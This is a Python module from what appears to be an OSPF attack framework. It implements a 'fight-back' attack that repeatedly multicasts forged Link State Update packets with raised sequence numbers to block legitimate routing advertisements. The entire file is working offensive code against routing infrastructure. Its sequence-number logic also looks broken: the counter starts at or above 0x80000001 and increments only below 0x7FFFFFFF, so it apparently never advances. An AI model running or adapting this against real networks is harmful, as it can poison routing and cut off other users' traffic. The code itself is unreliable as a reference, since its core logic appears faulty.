from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import LSAConfig
from ospf_attack.core.packet import build_lsu_packet, build_lsa_with_body, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class FightBackAttack(BaseAttack):
    name = "fight-back"
    description = "持续注入更高序列号的对抗 LSA 阻止合法 LSA 传播"
    category = AttackCategory.LSA
    needs_repeated = True
    config: LSAConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        self._seq = max(self.config.sequence_number, 0x80000001)

    def send_one_round(self) -> bool:
        src_ip = getattr(self, "_src_ip", None)
        if src_ip is None:
            from ospf_attack.network.adapter import get_local_ip
            src_ip = get_local_ip(self.config.iface)
            self._src_ip = src_ip

        seq = self._seq
        if seq < 0x7FFFFFFF:
            seq += 1
        self._seq = seq

        lsa = build_lsa_with_body(
            lsa_type=self.config.lsa_type,
            link_state_id=self.config.link_state_id or self.config.router_id,
            advertising_router=self.config.advertising_router or self.config.router_id,
            sequence=seq, age=0,
        )
        pkt = build_lsu_packet(
            router_id=self.config.router_id, area_id=self.config.area_id,
            src_ip=self._src_ip, dst_ip=OSPF_MULTICAST_ALL, lsa_count=1,
        )
        pkt = pkt / lsa
        return self._sender.send_raw(pkt)

    def launch(self) -> AttackResult:
        ok = self.send_one_round()
        return AttackResult(success=ok, packets_sent=self._sender.sent_count,
                           target_affected=False, details=f"Fight-Back 攻击: seq={self._seq}")

    def verify(self) -> bool:
        return self._sender.sent_count > 1

    def teardown(self) -> None:
        pass
